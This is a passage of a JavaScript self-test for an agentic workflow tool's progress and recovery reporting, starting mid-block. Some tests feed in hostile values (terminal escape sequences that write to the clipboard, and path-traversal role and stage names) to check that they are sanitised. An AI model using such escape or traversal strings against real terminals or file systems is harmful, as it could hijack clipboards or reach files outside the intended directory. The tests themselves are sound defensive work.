      assert.ok(disputedTerminal.includes('→ run: agentic conflicts FEAT-6'), disputedTerminal);
    } finally { if (previousCli === undefined) delete process.env.AI_AGENTIC_CLI; else process.env.AI_AGENTIC_CLI = previousCli; }
    // One decided: the one left is named in the resolve command, and the key changes (a re-notification).
    writeConflicts([six[0], { ...six[1], status: 'resolved' }, six[2]]);
    const one = needsYou('FEAT-6', conflicts, { root, cli: true });
    assert.strictEqual(one.headline, '1 conflict needs your decision');
    assert.ok(one.reason.includes('agentic resolve FEAT-6 CONFLICT-002 --decision'), one.reason);
    assert.strictEqual(one.key, 'FEAT-6|plan|waiting|CONFLICT-002=C+D');
    // Renumbered: the same ids over a different finding pair is a different block.
    writeConflicts([six[0], { ...six[1], findings: ['X', 'Y'] }, six[2]]);
    const renumbered = needsYou('FEAT-6', conflicts, { root, cli: true });
    assert.deepStrictEqual(renumbered.conflicts, disputed.conflicts);
    assert.notStrictEqual(renumbered.key, disputed.key);
    // All decided: no banner, and CURRENT is the plan again.
    writeConflicts(six.map(c => ({ ...c, status: 'resolved' })));
    assert.strictEqual(needsYou('FEAT-6', conflicts, { root }), null);
    assert.strictEqual(buildSummary('FEAT-6', conflicts, { root }).current, 'Waiting for Implementation Plan');
    // While arbitration runs again, the file still holds the previous set: no banner.
    writeConflicts(six);
    assert.strictEqual(needsYou('FEAT-6', { ...conflicts, phases: { ...conflicts.phases, 'conflict-arbitration': { status: 'in_progress' } } }, { root }), null);
    assert.strictEqual(needsYou('FEAT-6', { ...conflicts, phases: { ...conflicts.phases, 'conflict-arbitration': { status: 'pass' } } }, { root, cli: true }).key, disputed.key);
    // A topic is printable text, at most 40 characters.
    writeConflicts([{ id: 'CONFLICT-001', topic: '\x1b]52;c;ZXZpbA==\x07' + 'x'.repeat(300), findings: ['A', 'B'], status: 'unresolved' }]);
    const hostileConflict = needsYou('FEAT-6', conflicts, { root, cli: true });
    assert.ok(!/[\x1b\x07]/.test(hostileConflict.reason), JSON.stringify(hostileConflict.reason));
    assert.ok(hostileConflict.reason.match(/^CONFLICT-001 \(([^)]*)\)/)[1].length <= 40, hostileConflict.reason);
    // Many conflicts: the list shrinks to "+N more" so both commands survive.
    fs.mkdirSync(path.join(root, 'FEAT-8', '05-analysis'), { recursive: true });
    fs.writeFileSync(path.join(root, 'FEAT-8', '05-analysis', 'conflicts.json'), JSON.stringify({ conflicts: Array.from({ length: 7 }, (_, i) => ({ id: `CONFLICT-00${i + 1}`, topic: `a long disputed topic number ${i + 1} `.repeat(4), findings: [`A${i}`, `B${i}`], status: 'unresolved' })) }));
    const many = needsYou('FEAT-8', conflicts, { root, cli: true });
    assert.ok(many.reason.length <= 220, many.reason.length);
    assert.ok(many.reason.includes(' more. Decide each with:'), many.reason);
    assert.ok(many.reason.endsWith('agentic resume FEAT-8'), many.reason);
    // Node form with a long run id: the resolve template gives way, the resume command is whole.
    fs.mkdirSync(path.join(root, 'APPCONFIG-master2', '05-analysis'), { recursive: true });
    fs.writeFileSync(path.join(root, 'APPCONFIG-master2', '05-analysis', 'conflicts.json'), JSON.stringify({ conflicts: ['token storage location', 'cache ttl', 'retry policy'].map((topic, i) => ({ id: `CONFLICT-00${i + 1}`, topic, findings: [`A${i}`, `B${i}`], status: 'unresolved' })) }));
    for (const [cli, resume] of [[false, 'node ai/workflow/engine.js resume APPCONFIG-master2'], [true, 'agentic resume APPCONFIG-master2']]) {
      const node = needsYou('APPCONFIG-master2', conflicts, { root, cli });
      assert.ok(node.reason.length <= 220 && node.reason.endsWith(resume), node.reason);
      assert.ok(!node.reason.includes('…'), node.reason);
    }
    const longId = 'X'.repeat(40);
    fs.mkdirSync(path.join(root, longId, '05-analysis'), { recursive: true });
    fs.copyFileSync(path.join(root, 'APPCONFIG-master2', '05-analysis', 'conflicts.json'), path.join(root, longId, '05-analysis', 'conflicts.json'));
    assert.ok(needsYou(longId, conflicts, { root, cli: true }).reason.endsWith(`agentic resume ${longId}`));
    // Arbitration re-ran after the file was written (a rework): it is stale, no banner.
    const stale = path.join(root, 'APPCONFIG-master2', '05-analysis');
    fs.writeFileSync(path.join(stale, 'arbitration.json'), '{"conflicts":[]}');
    fs.utimesSync(path.join(stale, 'conflicts.json'), 1000, 1000); fs.utimesSync(path.join(stale, 'arbitration.json'), 2000, 2000);
    assert.strictEqual(needsYou('APPCONFIG-master2', conflicts, { root, cli: true }), null);
    const manyFull = needsYou('FEAT-8', conflicts, { root, cli: true, reasonMax: Infinity });
    for (let i = 1; i <= 7; i++) assert.ok(manyFull.reason.includes(`CONFLICT-00${i}`), manyFull.reason);
    assert.strictEqual(commandFor('resolve', 'R1', true, 'CONFLICT-004'), 'agentic resolve R1 CONFLICT-004 --decision "..." --rationale "..."');
    assert.ok(commandFor('resolve', 'R1', false).startsWith('node ai/workflow/conflicts.js resolve R1 '));
    // An architecture selection gate.
    const arch = { status: 'active', roles: {}, phases: { 'architecture-options': { status: 'pass', updatedAt: 'a1' } } };
    assert.deepStrictEqual([needsYou('FEAT-7', arch, { root, cli: true }).stage, needsYou('FEAT-7', arch, { root, cli: true }).command], ['architecture-selection', 'agentic architecture FEAT-7 <option-id>']);

    // Recovery commands: the "Commands:" block under a needs-you, with every
    // command that moves the run on, and the log and artifacts that exist.
    const { relativeStatePath } = require('./paths');
    const pairs = r => r.items.map(i => [i.label, i.text]);
    const touch = (id, rel) => { fs.mkdirSync(path.dirname(path.join(root, id, rel)), { recursive: true }); fs.writeFileSync(path.join(root, id, rel), 'x'); };
    assert.strictEqual(recoveryCommands('FEAT-1', null), null);
    assert.deepStrictEqual([commandFor('status', 'R1', true), commandFor('status', 'R1', false), commandFor('doctor', 'R1', true), commandFor('doctor', 'R1', false), commandFor('pr', 'R1', true), commandFor('pr', 'R1', false), commandFor('retry-role', 'R1', true, 'plan'), commandFor('retry-role', 'R1', false, 'fixes')],
      ['agentic status R1', 'node ai/workflow/progress.js --run R1', 'agentic doctor', 'node ai/workflow/doctor.js', 'agentic pr R1', 'node ai/workflow/engine.js pr R1', 'agentic retry R1 plan', 'node ai/tasks/feature/runs.js retry R1 fixes && node ai/workflow/engine.js resume R1']);
    // A failed stage: retry, status, doctor; the log and the stage's files once they exist.
    const failedAttention = needsYou('FEAT-1', failed, { root, cli: true });
    const failedRec = recoveryCommands('FEAT-1', failedAttention, { root, cli: true, state: failed });
    assert.deepStrictEqual(pairs(failedRec), [['retry', 'agentic retry FEAT-1'], ['status', 'agentic status FEAT-1'], ['doctor', 'agentic doctor']]);
    assert.deepStrictEqual(failedRec.lines, ['Commands:', '  retry   agentic retry FEAT-1', '  status  agentic status FEAT-1', '  doctor  agentic doctor']);
    assert.deepStrictEqual(failedRec.short, ['status: agentic status FEAT-1', 'doctor: agentic doctor'], 'the short form leaves the primary command out');
    for (const rel of ['engine/background.log', '08-build-test.md', 'engine/build-test-qa-execute.rejected']) touch('FEAT-1', rel);
    const withFiles = recoveryCommands('FEAT-1', failedAttention, { root, cli: true, state: failed });
    assert.deepStrictEqual(pairs(withFiles).slice(3), [['log', relativeStatePath('FEAT-1', 'engine/background.log')], ['artifact', relativeStatePath('FEAT-1', '08-build-test.md')], ['rejected', relativeStatePath('FEAT-1', 'engine/build-test-qa-execute.rejected')]]);
    const nodeForm = recoveryCommands('FEAT-1', needsYou('FEAT-1', failed, { root, cli: false }), { root, cli: false, state: failed });
    assert.deepStrictEqual(pairs(nodeForm), [['retry', 'node ai/tasks/feature/runs.js retry FEAT-1 && node ai/workflow/engine.js resume FEAT-1'], ['why', 'node ai/workflow/progress.js --run FEAT-1 --why'], ['status', 'node ai/workflow/progress.js --run FEAT-1'], ['doctor', 'node ai/workflow/doctor.js'], ['log', 'ai/runs/FEAT-1/engine/background.log'], ['artifact', 'ai/runs/FEAT-1/08-build-test.md'], ['rejected', 'ai/runs/FEAT-1/engine/build-test-qa-execute.rejected']]);
    assert.ok(nodeForm.items.every(i => !i.text.includes('…')), 'every item is whole');
    assert.strictEqual(nodeForm.lines[1], '  retry     node ai/tasks/feature/runs.js retry FEAT-1 && node ai/workflow/engine.js resume FEAT-1', 'labels are padded to the widest');
    const withBlock = needsYouLines(failedAttention, withFiles);
    assert.deepStrictEqual(withBlock.slice(-withFiles.lines.length), withFiles.lines.map(l => `  ${l}`), 'the block ends the needs-you lines');
    assert.strictEqual(withBlock.indexOf('  Commands:'), withBlock.length - withFiles.lines.length);
    // The same failure again gives the same block; the headline already says the fix is elsewhere.
    assert.deepStrictEqual(pairs(recoveryCommands('FEAT-1', { ...failedAttention, repeated: 3 }, { root, cli: true, state: failed })), pairs(withFiles));
    const fileSummary = buildSummary('FEAT-1', failed, { root });
    assert.deepStrictEqual(fileSummary.recovery.items.map(i => i.label), ['retry', 'why', 'status', 'doctor', 'log', 'artifact', 'rejected']);
    assert.match(renderTerminal(fileSummary), /\n {3}→ run: .*\n {3}Commands:\n {5}retry\s+/);
    assert.match(renderMarkdown(fileSummary), /> Run: `.*`  \n> Commands:  \n> retry: `.*`  \n> why: `.*`  \n> status: `/);
    assert.ok(!renderMarkdown(fileSummary, { published: true }).includes('Commands'), 'the published comment carries no block');
    for (const [text, what] of [[renderMarkdown(fileSummary), 'markdown with block']]) {
      const lines = text.split('\n');
      const at = lines.indexOf('| Stage | Status |');
      assert.strictEqual(lines[at - 1], '', `${what}: an empty line before the stage table`);
      for (let i = 1; i < at; i++) if (lines[i - 1].startsWith('>') && !lines[i].startsWith('>')) assert.strictEqual(lines[i], '');
    }
    // A parallel stage: one retry per stopped role, and its artifact.
    touch('FEAT-2', '09-reviews/security-reviewer.md');
    assert.deepStrictEqual(pairs(recoveryCommands('FEAT-2', review, { root, cli: true, state: reviews })), [['retry', 'agentic retry FEAT-2'], ['retry security-review', 'agentic retry FEAT-2 security-review'], ['status', 'agentic status FEAT-2'], ['doctor', 'agentic doctor'], ['artifact', relativeStatePath('FEAT-2', '09-reviews/security-reviewer.md')]]);
    // A blocked conditional role: its own retry and its device artifact.
    const cond = { status: 'active', roles: {}, phases: passed('verification'), conditionals: { verification: { 'mobile-evidence': { status: 'blocked', reason: 'no booted Android emulator', updatedAt: 't2' } } } };
    touch('FEAT-3', 'device/mobile-device-qc.md');
    assert.deepStrictEqual(pairs(recoveryCommands('FEAT-3', needsYou('FEAT-3', cond, { root, cli: true }), { root, cli: true, state: cond })), [['retry', 'agentic retry FEAT-3'], ['retry mobile-evidence', 'agentic retry FEAT-3 mobile-evidence'], ['status', 'agentic status FEAT-3'], ['doctor', 'agentic doctor'], ['artifact', relativeStatePath('FEAT-3', 'device/mobile-device-qc.md')]]);
    // A blocked pull request: resume, pr, the artifact and the rejected description.
    for (const rel of ['12-pull-request.md', 'engine/pull-request-pr-description.rejected']) touch('FEAT-4', rel);
    assert.deepStrictEqual(pairs(recoveryCommands('FEAT-4', needsYou('FEAT-4', pr, { root, cli: true }), { root, cli: true, state: pr })), [['resume', 'agentic resume FEAT-4'], ['pr', 'agentic pr FEAT-4'], ['why', 'agentic why FEAT-4'], ['status', 'agentic status FEAT-4'], ['doctor', 'agentic doctor'], ['artifact', relativeStatePath('FEAT-4', '12-pull-request.md')], ['rejected', relativeStatePath('FEAT-4', 'engine/pull-request-pr-description.rejected')]]);
    // The approval gate: approve, rework the plan, the plan file.
    fs.unlinkSync(path.join(root, 'FEAT-5', 'plan.approved'));
    assert.deepStrictEqual(pairs(recoveryCommands('FEAT-5', needsYou('FEAT-5', gate, { root, cli: true }), { root, cli: true, state: gate })), [['approve', 'agentic approve FEAT-5'], ['rework plan', 'agentic retry FEAT-5 plan'], ['status', 'agentic status FEAT-5'], ['doctor', 'agentic doctor'], ['artifact', relativeStatePath('FEAT-5', '06-plan.md')]]);
    // The architecture gate: select, both files.
    for (const rel of ['05-architecture-assessment.md', '05-architecture-options.md']) touch('FEAT-7', rel);
    assert.deepStrictEqual(pairs(recoveryCommands('FEAT-7', needsYou('FEAT-7', arch, { root, cli: true }), { root, cli: true, state: arch })), [['select', 'agentic architecture FEAT-7 <option-id>'], ['status', 'agentic status FEAT-7'], ['doctor', 'agentic doctor'], ['artifact', relativeStatePath('FEAT-7', '05-architecture-assessment.md')], ['artifact', relativeStatePath('FEAT-7', '05-architecture-options.md')]]);
    // Open conflicts: list, resolve (the real id when one is left), resume, the file.
    writeConflicts(six);
    assert.deepStrictEqual(pairs(recoveryCommands('FEAT-6', needsYou('FEAT-6', conflicts, { root, cli: true }), { root, cli: true, state: conflicts })), [['conflicts', 'agentic conflicts FEAT-6'], ['resolve', 'agentic resolve FEAT-6 <conflict-id> --decision "..." --rationale "..."'], ['resume', 'agentic resume FEAT-6'], ['status', 'agentic status FEAT-6'], ['doctor', 'agentic doctor'], ['artifact', relativeStatePath('FEAT-6', '05-analysis/conflicts.json')]]);
    writeConflicts([six[0], { ...six[1], status: 'resolved' }, six[2]]);
    assert.strictEqual(recoveryCommands('FEAT-6', needsYou('FEAT-6', conflicts, { root, cli: true }), { root, cli: true, state: conflicts }).items[1].text, 'agentic resolve FEAT-6 CONFLICT-002 --decision "..." --rationale "..."');
    // An error the state does not record, and a stage id from state.json that
    // the workflow does not know: a command, never a path.
    assert.deepStrictEqual(pairs(recoveryCommands('FEAT-9', { kind: 'error', stage: 'build-test', role: null, command: 'agentic retry FEAT-9' }, { root, cli: true })), [['retry', 'agentic retry FEAT-9'], ['status', 'agentic status FEAT-9'], ['doctor', 'agentic doctor']]);
    const hostileStage = { status: 'active', roles: {}, phases: { ...passed('build-test'), '../../evil': { status: 'fail', note: 'x', updatedAt: 't' } } };
    const hostileRec = recoveryCommands('FEAT-9', needsYou('FEAT-9', hostileStage, { root, cli: true }), { root, cli: true, state: hostileStage, exists: () => true });
    assert.ok(hostileRec.items.every(i => !i.text.includes('evil')), JSON.stringify(hostileRec.items));
    // A role key from state.json, as a stopped parallel role and as a blocked
    // conditional role: no control character reaches the printed block, no
    // `retry <role>` names what runs.js would refuse, and no existence probe
    // leaves the run directory. The valid role beside it keeps its retry.
    const evilRole = 'x\x1b]52;c;ZXZpbA==\x07\x1b[2K/../../../../tmp/esc';
    const hostileReviews = { status: 'active', phases: { ...passed('reviews'), reviews: { status: 'fail', updatedAt: 't' } }, roles: { reviews: { [evilRole]: { status: 'fail', note: 'bad', updatedAt: 't' }, 'security-review': { status: 'fail', note: 'leak', updatedAt: 't' } } } };
    const hostileCond = { status: 'active', roles: {}, phases: passed('verification'), conditionals: { verification: { [evilRole]: { status: 'blocked', reason: 'no device', updatedAt: 't' } } } };
    for (const [state, expectRetry] of [[hostileReviews, 'agentic retry FEAT-9 security-review'], [hostileCond, null]]) {
      const probes = [];
      const attention = needsYou('FEAT-9', state, { root, cli: true });
      assert.ok(attention, 'the stop is reported');
      const rec = recoveryCommands('FEAT-9', attention, { root, cli: true, state, exists: rel => { probes.push(rel); return true; } });
      const printed = [...needsYouLines(attention, rec), ...rec.items.map(i => `${i.label} ${i.text}`)].join(' ');
      assert.ok(!/[\x00-\x1f\x7f-\x9f]/.test(printed), JSON.stringify(printed));
      assert.ok(rec.items.every(i => !/\.\.|tmp|esc/.test(i.text)), JSON.stringify(rec.items));
      assert.ok(probes.length && probes.every(rel => !rel.split(/[\\/]/).includes('..') && !/[\x00-\x1f]/.test(rel)), JSON.stringify(probes));
      assert.deepStrictEqual(rec.items.filter(i => i.label.startsWith('retry ')).map(i => i.text), expectRetry ? [expectRetry] : []);
    }
    // Stalled: a stage in progress whose engine left its record and is gone.
    const { recordFor } = require('./engine-owner');
    const { stalledAttention } = require('./progress');
    const half = { status: 'active', roles: {}, phases: { ...passed('implementation'), implementation: { status: 'in_progress', updatedAt: 't' } } };
    fs.mkdirSync(path.join(root, 'FEAT-10', 'engine'), { recursive: true });
    assert.strictEqual(buildSummary('FEAT-10', half, { root }).stalled, null, 'no record (a run driven by hand): not stalled');
    fs.writeFileSync(path.join(root, 'FEAT-10', 'engine', 'engine.pid'), recordFor(999999, 'resume'));
    const stalledSummary = buildSummary('FEAT-10', half, { root });
    assert.strictEqual(stalledSummary.needsYou, null, 'needsYou stays as it is');
    assert.deepStrictEqual([stalledSummary.stalled.kind, stalledSummary.stalled.stage, stalledSummary.stalled.headline, stalledSummary.engine], ['stalled', 'implementation', 'Implementation is in progress but its engine (pid 999999) is gone', null]);
    assert.match(stalledSummary.stalled.key, /^FEAT-10\|implementation\|stalled\|/);
    assert.deepStrictEqual(stalledSummary.recovery.items.map(i => i.label), ['retry', 'status', 'doctor', 'owner']);
    assert.strictEqual(stalledSummary.recovery.items[0].text, stalledSummary.stalled.command);
    assert.match(renderTerminal(stalledSummary), /⚠ Needs you: Implementation is in progress but its engine \(pid 999999\) is gone\n.*\n {3}→ run: .*\n {3}Commands:\n/);
    assert.match(renderMarkdown(stalledSummary), /\*\*Needs you:\*\* Implementation is in progress but its engine/);
    assert.strictEqual(stalledAttention('FEAT-10', { ...half, status: 'done' }, root), null);
    assert.strictEqual(stalledAttention('FEAT-10', { ...half, phases: passed('implementation') }, root), null, 'nothing in progress');
    assert.strictEqual(buildSummary('FEAT-10', failed, { root }).stalled, null, 'a stopped stage is a needs-you, not a stall');
    assert.strictEqual(stalledAttention('FEAT-10', half, root, true).command, 'agentic retry FEAT-10');
    // A record from another host cannot be checked from here: never called gone
    // (a long implementation on a second machine is not a stall), even past
    // engine-owner's other-host age limit.
    fs.writeFileSync(path.join(root, 'FEAT-10', 'engine', 'engine.pid'), JSON.stringify({ pid: 4242, host: 'other-laptop', command: 'resume', startedAt: new Date(Date.now() - 7 * 3600 * 1000).toISOString() }));
    const elsewhere = buildSummary('FEAT-10', half, { root });
    assert.deepStrictEqual([elsewhere.stalled, elsewhere.engine, elsewhere.recovery], [null, null, null], 'an other-host record is never a stall');
    fs.writeFileSync(path.join(root, 'FEAT-10', 'engine', 'engine.pid'), recordFor(process.pid, 'resume'));
    const driving = buildSummary('FEAT-10', half, { root });
    assert.deepStrictEqual([driving.stalled, driving.engine.pid], [null, process.pid], 'a live engine wins');
    // The stall check reuses the summary's own liveness result: with a live
    // record, a summary of an in-progress stage runs `ps` no more often than
    // one with nothing in progress (counted through a PATH shim around ps).
    const realPs = String(spawnSync('sh', ['-c', 'command -v ps'], { encoding: 'utf8' }).stdout || '').trim();
    if (realPs && process.platform !== 'win32') {
      const shimDir = path.join(root, 'shim'), counter = path.join(root, 'ps-calls');
      fs.mkdirSync(shimDir);
      fs.writeFileSync(path.join(shimDir, 'ps'), `#!/bin/sh\necho x >> "${counter}"\nexec "${realPs}" "$@"\n`, { mode: 0o755 });
      const previousPath = process.env.PATH;
      process.env.PATH = `${shimDir}${path.delimiter}${previousPath}`;
      const psCalls = () => { try { return fs.readFileSync(counter, 'utf8').split('x').length - 1; } catch { return 0; } };
      try {
        buildSummary('FEAT-10', half, { root });
        const first = psCalls();
        assert.ok(first > 0, 'the shim counts ps');
        buildSummary('FEAT-10', { ...half, phases: passed('implementation') }, { root });
        const second = psCalls() - first;
        buildSummary('FEAT-10', half, { root });
        assert.strictEqual(psCalls() - first - second, second, 'an in-progress stage adds no ps call');
      } finally { process.env.PATH = previousPath; }
    }
    assert.strictEqual(stalledAttention('FEAT-10', half, root, true, { engine: { pid: 1, kind: 'engine' } }), null, 'a liveness result handed in is trusted');
    fs.writeFileSync(path.join(root, 'FEAT-10', 'engine', 'engine.pid'), recordFor(999999, 'resume'));
    assert.strictEqual(stalledAttention('FEAT-10', half, root, true, { engine: null }).kind, 'stalled');
  } finally { fs.rmSync(root, { recursive: true, force: true }); }
}

// A stage stopped by a rejected agent report: the report says why, and the
// options start with what fits it.
{
  const { whyLines, needsYouLines } = require('./progress');
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'progress-why-'));
  try {
    const id = 'WHY-1';
    fs.mkdirSync(path.join(root, id, 'engine'), { recursive: true });
    const report = { status: 'fail', summary: 'All tests pass, but pub get rewrote pubspec.lock.', tests: { passed: 80, failed: 0, skipped: 0 },
      commands: [{ command: 'flutter test', status: 'pass' }, { command: 'git checkout -- pubspec.lock', status: 'blocked', note: 'role may not run mutating shell commands' }, { command: 'flutter analyze', status: 'fail', note: '1 new info lint' }],
      acceptanceCoverage: { 'AC-1': 'pass', 'AC-18': 'fail: analyzer gate not met' },
      sideEffects: [{ file: 'pubspec.lock', change: '28-line re-resolve' }, { file: 'analysis_options.yaml', change: '+3 excludes' }], notRun: ['Sonar'] };
    fs.writeFileSync(path.join(root, id, 'engine', 'build-test-qa-execute.rejected'), JSON.stringify(report));
    const state = { status: 'active', roles: {}, phases: { ...Object.fromEntries(['request', 'requirements', 'acceptance-criteria', 'definition-of-done', 'inspection', 'analysis', 'plan', 'approval', 'implementation'].map(p => [p, { status: 'pass' }])), 'build-test': { status: 'fail', updatedAt: 't1', note: 'build-test/qa-execute: artifact rejected — ag' } } };
    const attention = needsYou(id, state, { root, cli: true });
    assert.strictEqual(attention.details.role, 'qa-execute');
    assert.strictEqual(attention.details.tests, '80 passed, 0 failed, 0 skipped');
    assert.deepStrictEqual(attention.details.failed.map(f => f.split(' — ')[0]), ['git checkout -- pubspec.lock', 'flutter analyze']);
    assert.deepStrictEqual(attention.details.acceptance, ['AC-18: fail: analyzer gate not met']);
    assert.deepStrictEqual(attention.options.map(o => o.label), ['Revert what its tools changed (if still changed)', 'Read the full report', 'Leave a note the retry will read (evidence, a decision)', 'Retry the stage']);
    assert.match(attention.options[0].command, /checkout -- pubspec\.lock analysis_options\.yaml$/);
    assert.strictEqual(attention.options.at(-1).command, 'agentic retry WHY-1', 'retry stays last');
    const terminal = needsYouLines(attention).join('\n');
    assert.match(terminal, /All tests pass, but pub get rewrote pubspec\.lock\./, 'the agent\'s own summary replaces the cut-down note');
    assert.match(terminal, /✗ flutter analyze — fail: 1 new info lint/);
    const why = whyLines(id, state, { root, cli: true }).join('\n');
    for (const part of ['What the agent said:', 'Tests: 80 passed', 'Acceptance criteria not met:', '! pubspec.lock — 28-line re-resolve', 'Not run:', 'What you can do:']) assert.ok(why.includes(part), `why shows ${part}`);
    assert.ok(!/agentic why WHY-1/.test(why), 'why does not offer itself');
    // Restored by the runtime: no revert to offer.
    fs.writeFileSync(path.join(root, id, 'engine', 'build-test-qa-execute.restored.json'), JSON.stringify({ restored: [{ path: 'pubspec.lock', from: 'HEAD' }, { path: 'analysis_options.yaml', from: 'HEAD' }] }));
    const after = needsYou(id, state, { root, cli: true });
    assert.ok(!after.options.some(o => /Revert/.test(o.label)), 'nothing left to revert');
    assert.match(needsYouLines(after).join('\n'), /pubspec\.lock \(restored by the runtime\)/);
    // A failure with no report keeps the old shape.
    fs.rmSync(path.join(root, id, 'engine'), { recursive: true, force: true });
    const plain = needsYou(id, state, { root, cli: true });
    assert.strictEqual(plain.details, null);
    assert.deepStrictEqual(plain.options.map(o => o.label), ['Leave a note the retry will read (evidence, a decision)', 'Retry the stage']);
    assert.match(whyLines('NONE', { status: 'done', phases: {} }, { root }).join(''), /nothing is waiting on you\. The run is closed\./);
  } finally { fs.rmSync(root, { recursive: true, force: true }); }
}

// Role descriptions and live activity: terminal views only.
{
  const { withActivity, renderMarkdown } = require('./progress');
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'progress-activity-'));
  try {
    const state = { status: 'active', startedAt: new Date().toISOString(), phases: { implementation: { status: 'in_progress', updatedAt: new Date(Date.now() - 90000).toISOString() }, analysis: { status: 'in_progress' } }, selectedRoles: { analysis: ['security', 'docs'] }, roles: { analysis: { security: { status: 'in_progress', executor: 'claude', updatedAt: new Date().toISOString() }, docs: { status: 'pass', executor: 'claude' } } } };
    const run = path.join(root, 'ACT-1');
    fs.mkdirSync(path.join(run, 'engine'), { recursive: true });
    fs.writeFileSync(path.join(run, 'engine', 'analysis-security.activity.jsonl'), `${JSON.stringify({ t: new Date().toISOString(), kind: 'tool', text: 'Read lib/auth/session.dart' })}\n`);
    const summary = withActivity(buildSummary('ACT-1', state, { root }), run);
    const analysis = summary.phases.find(p => p.id === 'analysis');
    assert.match(analysis.roles.find(r => r.role === 'security').description, /^Threat-model auth/);
    assert.strictEqual(analysis.roles.find(r => r.role === 'security').activity.text, 'Read lib/auth/session.dart');
    assert.strictEqual(analysis.roles.find(r => r.role === 'docs').activity, undefined, 'finished roles carry no activity');
    const impl = summary.phases.find(p => p.id === 'implementation');
    assert.strictEqual(impl.role, 'implementation');
    assert.strictEqual(impl.activity, null, 'a running stage with no file yet has no activity');
    const text = renderTerminal(summary);
    assert.match(text, /Threat-model auth/, 'the running role says what it does');
    assert.match(text, /↳ Read lib\/auth\/session\.dart · \d+s ago/, 'and what it is doing now');
    assert.match(text, /↳ working · 1m3\ds/, 'a stage with no activity yet shows how long it has run');
    assert.doesNotMatch(renderMarkdown(buildSummary('ACT-1', state, { root }), { published: true }), /session\.dart/, 'the published view never carries activity');
  } finally { fs.rmSync(root, { recursive: true, force: true }); }
}

console.log('progress-selftest OK');
